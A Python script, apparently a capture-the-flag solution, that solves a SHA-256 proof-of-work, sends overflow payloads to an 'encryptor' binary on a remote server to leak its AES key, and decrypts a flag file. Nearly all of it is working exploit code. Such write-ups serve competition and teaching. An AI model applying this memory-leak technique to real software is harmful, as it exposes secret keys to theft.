import os
from ptrlib import *
from Crypto.Cipher import AES

HOST = os.getenv('HOST', '153.125.128.105')
PORT = os.getenv('PORT', '9022')

sock = Socket(HOST, int(PORT))

import itertools
import hashlib
import string

table = string.ascii_letters + string.digits + "._"

r = sock.recvregex("sha256\(\"\?\?\?\?(.+)\"\) = ([0-9a-f]+)")
suffix = r[0].decode()
hashval = r[1].decode()
print(suffix, hashval)

for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        prefix = ''.join(v)
        print("[+] Prefix = " + prefix)
        break
else:
    print("[-] Solution not found :thinking_face:")

sock.sendline(prefix)

# Leak secret key
payload = [None, None, None]
for i in range(3):
    payload[i]  = b'A' * (0x22a - i)
    payload[i] += p64(0x602260)
    payload[i] = bytes2str(payload[i].strip(b'\x00'))

cmd  = "./encryptor "
cmd += "-o " + repr(payload[0]) + " "
cmd += "-o " + repr(payload[1]) + " "
cmd += "-o " + repr(payload[2]) + " "
cmd += "-x 2>&1 | xxd -ps"
sock.sendlineafter("$ ", cmd)

sock.recvline()
secret = bytes.fromhex(sock.recvonce(16*2).decode())
logger.info(b"secret = " + secret)
sock.close()

# Decrypt
with open("../files/flag.enc", "rb") as f:
    cipher = f.read()
    aes = AES.new(secret, AES.MODE_ECB)
    print(aes.decrypt(cipher).decode())
